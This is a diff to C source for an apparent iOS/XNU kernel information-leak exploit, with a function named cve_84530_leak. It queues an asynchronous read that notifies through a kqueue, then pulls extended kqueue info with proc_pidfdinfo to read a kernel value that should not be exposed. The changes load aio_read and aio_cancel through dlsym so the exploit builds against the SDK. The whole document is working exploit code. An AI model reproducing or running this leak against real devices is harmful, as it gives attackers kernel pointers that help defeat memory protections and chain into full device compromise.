@@ -4,22 +4,19 @@
 #include <stdint.h>
 #include <fcntl.h>
 #include <unistd.h>
+#include <dlfcn.h>
 #include <sys/event.h>
 #include <sys/types.h>
 #include <signal.h>
 #include <pthread.h>
 
-/* private constants stripped from iOS public SDK */
 #define SIGEV_KEVENT             3
-#define EVFILT_AIO_VAL           (-3)
+#define EVFILT_AIO_VAL           ((int16_t)(-3))
 #define PROC_PIDFDKQUEUE_EXTINFO 9
 
-/* declare with void* so we bypass public struct type check */
 extern int proc_pidfdinfo(int pid, int fd, int flavor, void *buf, int bufsz);
-extern int aio_read(void *aiocbp);
-extern int aio_cancel(int fd, void *aiocbp);
 
-/* full XNU sigevent — iOS SDK exposes only first 5 fields */
+/* full XNU sigevent - iOS SDK only exposes first 5 fields */
 struct sigevent_xnu {
     int             sigev_notify;
     int             sigev_signo;
@@ -33,7 +30,7 @@ struct sigevent_xnu {
     uint64_t        sigev_notify_kevent_id;
 };
 
-/* full aiocb with our extended sigevent */
+/* full aiocb with private sigevent */
 struct aiocb_xnu {
     int                  aio_fildes;
     int                  _pad0;
@@ -47,18 +44,39 @@ struct aiocb_xnu {
     int                  _pad2;
 };
 
-#define KEVENT_QOS_SIZE    72
+/* use dlsym to avoid conflicting with SDK aio_read declaration */
+typedef int (*aio_read_fn_t)(void *);
+typedef int (*aio_cancel_fn_t)(int, void *);
+
+static aio_read_fn_t   fn_aio_read   = NULL;
+static aio_cancel_fn_t fn_aio_cancel = NULL;
+
+static void load_aio_syms(void) {
+    void *lib = dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY | RTLD_NOLOAD);
+    if (!lib) lib = dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY);
+    if (!lib) return;
+    fn_aio_read   = (aio_read_fn_t)  dlsym(lib, "aio_read");
+    fn_aio_cancel = (aio_cancel_fn_t)dlsym(lib, "aio_cancel");
+}
+
 #define KQEXT_SDATA_OFFSET 72
 #define KQEXT_STRIDE       88
 
 static char g_result[512];
 
 uint64_t cve_84530_leak(void) {
+    load_aio_syms();
+    if (!fn_aio_read) {
+        snprintf(g_result, sizeof(g_result), "dlsym(aio_read) failed");
+        return 0;
+    }
+
     int fd = open("/dev/null", O_RDONLY);
     if (fd < 0) {
         snprintf(g_result, sizeof(g_result), "open() failed: %d", fd);
         return 0;
     }
+
     int kq = kqueue();
     if (kq < 0) {
         snprintf(g_result, sizeof(g_result), "kqueue() failed: %d", kq);
@@ -68,15 +86,15 @@ uint64_t cve_84530_leak(void) {
     struct aiocb_xnu cb;
     static char buf[128];
     memset(&cb, 0, sizeof(cb));
-    cb.aio_fildes                       = fd;
-    cb.aio_buf                          = buf;
-    cb.aio_nbytes                       = 1;
-    cb.aio_offset                       = 0;
-    cb.aio_sigevent.sigev_notify        = SIGEV_KEVENT;
-    cb.aio_sigevent.sigev_notify_kqueue = kq;
+    cb.aio_fildes                         = fd;
+    cb.aio_buf                            = buf;
+    cb.aio_nbytes                         = 1;
+    cb.aio_offset                         = 0;
+    cb.aio_sigevent.sigev_notify          = SIGEV_KEVENT;
+    cb.aio_sigevent.sigev_notify_kqueue   = kq;
     cb.aio_sigevent.sigev_value.sival_ptr = NULL;
 
-    int ret = aio_read(&cb);
+    int ret = fn_aio_read(&cb);
     if (ret != 0) {
         snprintf(g_result, sizeof(g_result),
             "aio_read() failed: %d (sandbox blocks AIO?)", ret);
@@ -91,7 +109,8 @@ uint64_t cve_84530_leak(void) {
     if (n <= 0) {
         snprintf(g_result, sizeof(g_result),
             "proc_pidfdinfo() failed: %d (sandbox blocks?)", n);
-        aio_cancel(fd, &cb); close(kq); close(fd); return 0;
+        if (fn_aio_cancel) fn_aio_cancel(fd, &cb);
+        close(kq); close(fd); return 0;
     }
 
     int count = n / KQEXT_STRIDE;
@@ -100,7 +119,7 @@ uint64_t cve_84530_leak(void) {
         int16_t   filter = *(int16_t  *)(entry + 8);
         int64_t   data   = *(int64_t  *)(entry + 32);
         uint64_t  sdata  = *(uint64_t *)(entry + KQEXT_SDATA_OFFSET);
-        if (filter == (int16_t)EVFILT_AIO_VAL) {
+        if (filter == EVFILT_AIO_VAL) {
             snprintf(g_result, sizeof(g_result),
                 "EVFILT_AIO found!\n"
                 "kqext_kev.data = 0x%llx (should be 0)\n"
@@ -109,13 +128,16 @@ uint64_t cve_84530_leak(void) {
                 (unsigned long long)data,
                 (unsigned long long)sdata,
                 (unsigned long long)sdata);
-            aio_cancel(fd, &cb); close(kq); close(fd);
+            if (fn_aio_cancel) fn_aio_cancel(fd, &cb);
+            close(kq); close(fd);
             return sdata;
         }
     }
+
     snprintf(g_result, sizeof(g_result),
         "No EVFILT_AIO found - %d knotes scanned", count);
-    aio_cancel(fd, &cb); close(kq); close(fd);
+    if (fn_aio_cancel) fn_aio_cancel(fd, &cb);
+    close(kq); close(fd);
     return 0;
 }
 
